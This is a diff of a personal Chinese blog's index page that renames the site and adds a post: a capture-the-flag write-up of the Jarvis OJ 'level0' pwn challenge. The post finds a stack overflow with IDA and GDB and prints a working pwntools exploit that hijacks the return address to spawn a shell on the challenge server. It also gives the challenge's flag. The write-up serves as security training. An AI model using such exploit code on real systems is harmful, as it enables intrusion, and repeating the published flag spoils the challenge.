@@ -22,9 +22,9 @@
 
   <meta name="description" content="日常学习记录">
 <meta property="og:type" content="website">
-<meta property="og:title" content="百文书屋">
+<meta property="og:title" content="学习笔记">
 <meta property="og:url" content="http://bigfog.github.io/index.html">
-<meta property="og:site_name" content="百文书屋">
+<meta property="og:site_name" content="学习笔记">
 <meta property="og:description" content="日常学习记录">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="BigFog">
@@ -43,7 +43,7 @@
   };
 </script>
 
-  <title>百文书屋</title>
+  <title>学习笔记</title>
   
 
 
@@ -94,7 +94,7 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">百文书屋</h1>
+      <h1 class="site-title">学习笔记</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
       <p class="site-subtitle" itemprop="description">脚踏实地 砥砺前行</p>
@@ -191,6 +191,106 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://bigfog.github.io/2021/03/03/PWN%E5%AD%A6%E4%B9%A0%E2%80%94[XMAN]%20level0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="BigFog">
+      <meta itemprop="description" content="日常学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习笔记">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/03/PWN%E5%AD%A6%E4%B9%A0%E2%80%94%5BXMAN%5D%20level0/" class="post-title-link" itemprop="url">PWN学习—[XMAN] level0</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-03 00:08:55" itemprop="dateCreated datePublished" datetime="2021-03-03T00:08:55+08:00">2021-03-03</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>778</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <hr>
+<p>title:   PWN学习—[XMAN] level0<br>date: 2021-3-1 00:55:00<br>tags: </p>
+<pre><code>- CTF
+- pwn</code></pre><p>  categories: </p>
+<pre><code>- 其他</code></pre><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>练习平台：<a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">https://www.jarvisoj.com/challenges</a></p>
+<p>题目：[ XMAN ] level 0</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C0.png" alt="image-20210302230037626"></p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C1.png" alt="image-20210302230145529"></p>
+<h2 id="二-分析"><a href="#二-分析" class="headerlink" title="二.分析"></a>二.分析</h2><h3 id="2-1-IDA查看"><a href="#2-1-IDA查看" class="headerlink" title="2.1 IDA查看"></a>2.1 IDA查看</h3><p><img src="C:%5CUsers%5Czzw%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210302230420875.png" alt="image-20210302230420875"></p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C2.png" alt="image-20210302230748270"></p>
+<p>这里要注意漏洞函数中read的第一个参数，这里表示的是标准输入，很明显这里存在一个栈溢出。</p>
+<p>查看是否有system（）、”/bin/sh”字符。</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C3.png" alt="image-20210302231236897"></p>
+<p>现成的system(“bin/sh”)</p>
+<h3 id="2-2-GDB调试"><a href="#2-2-GDB调试" class="headerlink" title="2.2 GDB调试"></a>2.2 GDB调试</h3><h4 id="2-2-1-查看安全机制"><a href="#2-2-1-查看安全机制" class="headerlink" title="2.2.1 查看安全机制"></a>2.2.1 查看安全机制</h4><p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C4.png" alt="image-20210302231527158"></p>
+<p>堆栈不可执行开启。</p>
+<h4 id="2-2-2-缓冲区大小调试"><a href="#2-2-2-缓冲区大小调试" class="headerlink" title="2.2.2  缓冲区大小调试"></a>2.2.2  缓冲区大小调试</h4><p>gdb中使用命令生成若干字符</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C5.png" alt="image-20210302233927577"></p>
+<p>命令：pattern create 200 </p>
+<p> <img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C6.png" alt="image-20210302233429253"></p>
+<p>然后将生成的这段字符，在程序需要输入的地方输入</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C7.png" alt="image-20210302233520257"></p>
+<p>查看rbp,数据</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C8.png" alt="image-20210302233552682"></p>
+<p>定位缓冲区大小</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C9.png" alt="image-20210302233633943"></p>
+<h3 id="2-2-3-编写poc"><a href="#2-2-3-编写poc" class="headerlink" title="2.2.3 编写poc"></a>2.2.3 编写poc</h3><p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C10.png" alt="image-20210302234617330"></p>
+<p>payload+= 128 *  ‘a’      //缓冲区的大小</p>
+<p>payload+= 8 *  ‘a’      //ebp   64位8个字节</p>
+<p>payload+= p64(0x400596)     //覆盖返回地址的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pro&#x3D;remote(&#39;pwn2.jarvisoj.com&#39;,9881)</span><br><span class="line">data&#x3D;pro.recv(100).decode()</span><br><span class="line">print(data) </span><br><span class="line">#payload&#x3D;flat([(128+8)*&#39;a&#39;,p64(0x400596)])        ##  python2.7</span><br><span class="line">payload&#x3D;(128)*&#39;a&#39;+p64(0xdeadbeef)+p64(0x400596)   ##  python3.6</span><br><span class="line">pro.send(payload)</span><br><span class="line">pro.interactive()</span><br><span class="line">pro.close()</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C11.png" alt="image-20210302235321824"></p>
+<p>flag</p>
+<p>CTF{713ca3944e92180e0ef03171981dcd41}</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://bigfog.github.io/2018/07/25/CVE-2011-0104%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -200,7 +300,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
+      <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -283,7 +383,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
+      <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -366,7 +466,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
+      <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -449,7 +549,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
+      <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -532,7 +632,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
+      <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -618,7 +718,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
+      <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -701,7 +801,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
+      <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -784,7 +884,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
+      <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -867,7 +967,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
+      <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -917,87 +1017,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2018/03/14/%E5%AE%89%E5%8D%93%E8%AE%BE%E7%BD%AE%E6%8C%89%E9%92%AE%E7%9B%91%E5%90%AC%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%96%B9%E5%BC%8F/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://bigfog.github.io/2018/03/09/APK%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8E%BB%E9%99%A4%E8%81%9A%E5%8A%9B%E8%A7%86%E9%A2%91HD%E7%9A%84%E5%B9%BF%E5%91%8A/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="BigFog">
-      <meta itemprop="description" content="日常学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="百文书屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/03/09/APK%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8E%BB%E9%99%A4%E8%81%9A%E5%8A%9B%E8%A7%86%E9%A2%91HD%E7%9A%84%E5%B9%BF%E5%91%8A/" class="post-title-link" itemprop="url">APK抓包分析去除聚力视频HD的广告</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2018-03-09 23:49:18" itemprop="dateCreated datePublished" datetime="2018-03-09T23:49:18+08:00">2018-03-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">逆向技术学习</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.4k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前视频播放类APK在播放前都会播放一段广告，短则几十秒，多则一分多钟。当然Vip会员就不会有广告播放，毕竟这也是人家重要的的收入来源。本文就用抓取流量包的方式获取到广告的url的地址，进而在播放视频时不会有广告的播放。实验所用的APK为“聚力视频HD”，这款应用没有做什么保护，分析操作起来较容易。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2018/03/09/APK%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8E%BB%E9%99%A4%E8%81%9A%E5%8A%9B%E8%A7%86%E9%A2%91HD%E7%9A%84%E5%B9%BF%E5%91%8A/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1088,7 +1107,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1128,7 +1147,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
